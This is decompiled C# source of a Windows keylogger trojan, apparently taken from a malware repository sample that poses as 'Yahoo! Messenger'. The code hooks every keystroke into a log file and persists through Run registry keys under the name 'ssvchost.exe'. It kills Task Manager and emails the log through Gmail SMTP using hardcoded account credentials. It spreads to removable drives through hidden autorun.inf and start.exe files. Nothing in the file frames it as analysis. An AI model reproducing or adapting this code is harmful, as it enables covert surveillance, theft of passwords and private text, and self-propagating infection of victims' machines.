// Decompiled with JetBrains decompiler
// Type: kdc.Program
// Assembly: Yahoo! Messenger, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AFCC6025-0F9A-4445-832F-174A54B7329E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.irg-6baa508a91305f9d0ad54c4fb4ae9aec1b030d7d1490752c3d6ba9a4d21e21d7.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace kdc
{
  internal class Program
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private static Program.LowLevelKeyboardProc _proc = new Program.LowLevelKeyboardProc(Program.HookCallback);
    private static IntPtr _hookID = IntPtr.Zero;
    public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "kdc.log");
    public static byte caps = 0;
    public static byte shift = 0;
    public static byte failed = 0;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      Program.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Main()
    {
      Program._hookID = Program.SetHook(Program._proc);
      Program.startup();
      System.Timers.Timer timer1 = new System.Timers.Timer();
      timer1.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
      timer1.AutoReset = true;
      timer1.Interval = 600000.0;
      timer1.Start();
      System.Timers.Timer timer2 = new System.Timers.Timer();
      timer2.Elapsed += new ElapsedEventHandler(Program.USBSpread);
      timer2.AutoReset = true;
      timer2.Interval = 10000.0;
      timer2.Start();
      Application.Run();
      GC.KeepAlive((object) timer1);
      GC.KeepAlive((object) timer2);
      Program.UnhookWindowsHookEx(Program._hookID);
    }

    public static void startup()
    {
      string sourceFileName = Application.ExecutablePath.ToString();
      string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ssvchost.exe");
      try
      {
        System.IO.File.Copy(sourceFileName, destFileName, true);
        sourceFileName = destFileName;
      }
      catch
      {
        Console.WriteLine("Không có phép để sao chép tập tin hoặc các sai sót khác.");
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("avatar") == null)
          registryKey.SetValue("avatar", (object) destFileName);
        registryKey.Close();
      }
      catch
      {
        Console.WriteLine("Error setting startup reg key.");
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("avatar") == null)
          registryKey.SetValue("avatar", (object) sourceFileName);
        registryKey.Close();
      }
      catch
      {
        Console.WriteLine("Error setting startup reg key for all users.");
      }
    }

    public static void OnTimedEvent(object source, EventArgs e)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.MainWindowTitle.Contains("Taskmgr.exe"))
          process.Kill();
      }
      MailMessage message = new MailMessage();
      message.To.Add("dungcoj15@gmail.com");
      message.From = new MailAddress("dungcoj15@gmail.com", "dungcoj", Encoding.UTF8);
      message.Subject = "May Client gui";
      message.SubjectEncoding = Encoding.UTF8;
      message.Body = "ciao ale";
      message.BodyEncoding = Encoding.UTF8;
      message.IsBodyHtml = false;
      message.Priority = MailPriority.High;
      SmtpClient smtpClient = new SmtpClient();
      smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential("dungcoj15@gmail.com", "dungphungba");
      smtpClient.Port = 587;
      smtpClient.Host = "smtp.gmail.com";
      smtpClient.EnableSsl = true;
      Attachment attachment = new Attachment(Program.path);
      message.Attachments.Add(attachment);
      try
      {
        smtpClient.Send(message);
        Program.failed = (byte) 0;
      }
      catch
      {
        attachment.Dispose();
        Program.failed = (byte) 1;
      }
      attachment.Dispose();
      if (Program.failed == (byte) 0)
        System.IO.File.WriteAllText(Program.path, "");
      Program.failed = (byte) 0;
    }

    private static IntPtr SetHook(Program.LowLevelKeyboardProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return Program.SetWindowsHookEx(13, proc, Program.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 256)
      {
        StreamWriter streamWriter = System.IO.File.AppendText(Program.path);
        int num = Marshal.ReadInt32(lParam);
        if (Keys.Shift == Control.ModifierKeys)
          Program.shift = (byte) 1;
        switch ((Keys) num)
        {
          case Keys.Back:
            streamWriter.Write("back");
            break;
          case Keys.Tab:
            streamWriter.Write("TAB");
            break;
          case Keys.Return:
            streamWriter.WriteLine("");
            break;
          case Keys.Capital:
            Program.caps = Program.caps != (byte) 0 ? (byte) 0 : (byte) 1;
            break;
          case Keys.Space:
            streamWriter.Write(" ");
            break;
          case Keys.D0:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("0");
              break;
            }
            streamWriter.Write(")");
            break;
          case Keys.D1:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("1");
              break;
            }
            streamWriter.Write("!");
            break;
          case Keys.D2:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("2");
              break;
            }
            streamWriter.Write("@");
            break;
          case Keys.D3:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("3");
              break;
            }
            streamWriter.Write("#");
            break;
          case Keys.D4:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("4");
              break;
            }
            streamWriter.Write("$");
            break;
          case Keys.D5:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("5");
              break;
            }
            streamWriter.Write("%");
            break;
          case Keys.D6:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("6");
              break;
            }
            streamWriter.Write("^");
            break;
          case Keys.D7:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("7");
              break;
            }
            streamWriter.Write("&");
            break;
          case Keys.D8:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("8");
              break;
            }
            streamWriter.Write("*");
            break;
          case Keys.D9:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("9");
              break;
            }
            streamWriter.Write("(");
            break;
          case Keys.LWin:
          case Keys.RWin:
          case Keys.Apps:
          case Keys.LShiftKey:
          case Keys.RShiftKey:
          case Keys.LControlKey:
          case Keys.RControlKey:
          case Keys.LMenu:
          case Keys.RMenu:
            streamWriter.Write("");
            break;
          case Keys.OemSemicolon:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write(";");
              break;
            }
            streamWriter.Write(":");
            break;
          case Keys.Oemplus:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("=");
              break;
            }
            streamWriter.Write("+");
            break;
          case Keys.Oemcomma:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write(",");
              break;
            }
            streamWriter.Write("<");
            break;
          case Keys.OemMinus:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("-");
              break;
            }
            streamWriter.Write("_");
            break;
          case Keys.OemPeriod:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write(".");
              break;
            }
            streamWriter.Write(">");
            break;
          case Keys.OemQuestion:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("/");
              break;
            }
            streamWriter.Write("?");
            break;
          case Keys.Oemtilde:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("`");
              break;
            }
            streamWriter.Write("~");
            break;
          case Keys.OemOpenBrackets:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("[");
              break;
            }
            streamWriter.Write("{");
            break;
          case Keys.OemPipe:
            streamWriter.Write("|");
            break;
          case Keys.OemCloseBrackets:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("]");
              break;
            }
            streamWriter.Write("}");
            break;
          case Keys.OemQuotes:
            if (Program.shift == (byte) 0)
            {
              streamWriter.Write("'");
              break;
            }
            streamWriter.Write('"');
            break;
          default:
            if (Program.shift == (byte) 0 && Program.caps == (byte) 0)
              streamWriter.Write(((Keys) num).ToString().ToLower());
            if (Program.shift == (byte) 1 && Program.caps == (byte) 0)
              streamWriter.Write(((Keys) num).ToString().ToUpper());
            if (Program.shift == (byte) 0 && Program.caps == (byte) 1)
              streamWriter.Write(((Keys) num).ToString().ToUpper());
            if (Program.shift == (byte) 1 && Program.caps == (byte) 1)
            {
              streamWriter.Write(((Keys) num).ToString().ToLower());
              break;
            }
            break;
        }
        Program.shift = (byte) 0;
        streamWriter.Close();
      }
      return Program.CallNextHookEx(Program._hookID, nCode, wParam, lParam);
    }

    public static void USBSpread(object source, EventArgs e)
    {
      string sourceFileName = Application.ExecutablePath.ToString();
      DriveInfo[] drives = DriveInfo.GetDrives();
      try
      {
        foreach (DriveInfo driveInfo in drives)
        {
          if (driveInfo.DriveType == DriveType.Removable)
          {
            StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
            streamWriter.WriteLine("[autorun]\n");
            streamWriter.WriteLine("open=start.exe");
            streamWriter.WriteLine("action=Run VMCLite");
            streamWriter.Close();
            System.IO.File.SetAttributes(driveInfo.Name + "autorun.inf", System.IO.File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
            try
            {
              System.IO.File.Copy(sourceFileName, driveInfo.Name + "start.exe", true);
              System.IO.File.SetAttributes(driveInfo.Name + "start.exe", System.IO.File.GetAttributes(driveInfo.Name + "start.exe") | FileAttributes.Hidden);
            }
            finally
            {
              Console.WriteLine("Removable device rooted");
            }
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
      }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
